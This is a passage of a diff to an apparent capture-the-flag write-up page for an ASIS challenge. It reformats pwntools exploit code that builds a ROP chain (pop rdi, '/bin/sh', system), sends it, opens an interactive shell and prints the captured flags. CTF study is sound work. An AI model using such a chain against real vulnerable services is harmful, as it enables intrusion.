+            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">pop_rdi_ret</span> <span class="o">&gt;&gt;</span> <span class="mi">40</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># pop_rdi_ret</span>
+            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">pop_rdi_ret</span> <span class="o">&gt;&gt;</span> <span class="mi">48</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># pop_rdi_ret</span>
+            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">pop_rdi_ret</span> <span class="o">&gt;&gt;</span> <span class="mi">56</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># pop_rdi_ret</span>
+           <span class="nb">str</span><span class="p">(</span><span class="n">bin_sh</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># bin_sh</span>
+            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">bin_sh</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># bin_sh</span>
+            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">bin_sh</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># bin_sh</span>
+            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">bin_sh</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># bin_sh</span>
+            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">bin_sh</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># bin_sh</span>
+            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">bin_sh</span> <span class="o">&gt;&gt;</span> <span class="mi">40</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># bin_sh</span>
+            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">bin_sh</span> <span class="o">&gt;&gt;</span> <span class="mi">48</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># bin_sh</span>
+            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">bin_sh</span> <span class="o">&gt;&gt;</span> <span class="mi">56</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># bin_sh</span>
+           <span class="nb">str</span><span class="p">(</span><span class="n">system_addr</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># system_addr</span>
+            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">system_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># system_addr</span>
+            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">system_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># system_addr</span>
+            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">system_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># system_addr</span>
+            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">system_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># system_addr</span>
+            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">system_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">40</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># system_addr</span>
+            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">system_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">48</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># system_addr</span>
+            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">system_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">56</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># system_addr</span>
+           <span class="p">]</span>
 
-<p>payloads[0] = str(len(payloads) + 16)</p>
-<h1 id="sending-payload-1">sending payload</h1>
-<p>for payload in payloads:
-    print r.recvuntil(“: “)
-    log.success(“sending: “+payload)
-    r.send(payload+”\n”)</p>
+<span class="n">payloads</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payloads</span><span class="p">)</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span>
+<span class="c"># sending payload</span>
+<span class="k">for</span> <span class="n">payload</span> <span class="ow">in</span> <span class="n">payloads</span><span class="p">:</span>
+    <span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">": "</span><span class="p">)</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"sending: "</span><span class="o">+</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="o">+</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
 
-<p>r.interactive()</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-And Finally, we get the flag2:
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 
 </code></pre></div></div>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>           Good job Mario, but your princess isn't here! 
 
-                           Get a shell!
-</code></pre></div></div>
+<p>And Finally, we get the flag2:</p>
 
-<p>Flag 1: ASIS{109096cca8948d1cebee782a11d2472b}
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>               Good job Mario, but your princess isn't here! 
+
+                               Get a shell!
+
+
+Flag 1: ASIS{109096cca8948d1cebee782a11d2472b}
 Do you want to play again (y/n)? $ n
 $ ls
 flag
@@ -680,11 +679,11 @@ freedom
 sawthis
 wrapper.sh
 $ cat flag
-7h15_ch4ll3ng3_g4v3_m3_br41n_c4nc3r</p>
+7h15_ch4ll3ng3_g4v3_m3_br41n_c4nc3r
 
-<p>Flag 2: ASIS{be70e244675b9acd21ac0097d4f9d69b}</p>
+Flag 2: ASIS{be70e244675b9acd21ac0097d4f9d69b}
 
-<p>```</p>
+</code></pre></div></div>
 
 <p>Brain cancer? LOL indeed, but it’s still a great challenge!</p>
 
